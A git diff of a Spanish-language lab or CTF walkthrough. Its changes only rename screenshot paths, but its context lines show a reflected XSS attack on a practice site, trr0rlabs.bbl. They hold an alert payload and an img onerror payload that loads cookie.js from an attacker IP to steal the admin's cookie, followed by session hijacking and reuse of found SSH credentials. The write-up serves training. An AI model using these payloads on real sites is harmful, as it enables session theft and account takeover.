@@ -375,7 +375,7 @@ URL = http://trr0rlabs.bbl/form.php/"><script>alert('XSS')</script>
 
 Veremos lo siguiente en la pagina.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que esta funcionando y se nos esta ejecutando un `XSS` ahora nuestro objetivo es obtener la `Cookie` del usuario `admin` o por lo menos intentarlo.
 
@@ -500,7 +500,7 @@ URL = trr0rlabs.bbl/form.php/"><img src/onerror=import("http:<IP_ATTACKER>:8000/
 
 En la consola de la pagina veremos que ha funcionado:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Y si volvemos a donde tenemos lanzado el servidor de `Node.js` veremos lo siguiente:
 
@@ -516,7 +516,7 @@ Vemos que lo capturo de forma correcta, pero sera la de nuestro `usuario` para o
 http://trr0rlabs.bbl/form.php/"><img src/onerror=import("http:<IP_ATTACKER>:8000/cookie.js")>
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ahora si esperamos un poco veremos que nos llega la `Cookie` del usuario `admin`.
 
@@ -528,11 +528,11 @@ Cookie guardada
 
 Vemos que ha funcionado y ahora solo tendremos que `inspeccionar` la pagina, irnos a `Storage` y en la parte de `Cookie` reemplazaremos la que tenemos actualmente por la del `admin`:
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Con esto veremos que somos el `rol` `admin` y si nos vamos a la pestaña de `admin` veremos que lo hemos conseguido:
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que las credenciales para el `SSH` aparecen ahi, pero no funciona la contraseña, si metemos por delante la palabra `trr0rson` veremos que funciona por lo que las credenciales serian las siguientes:
 
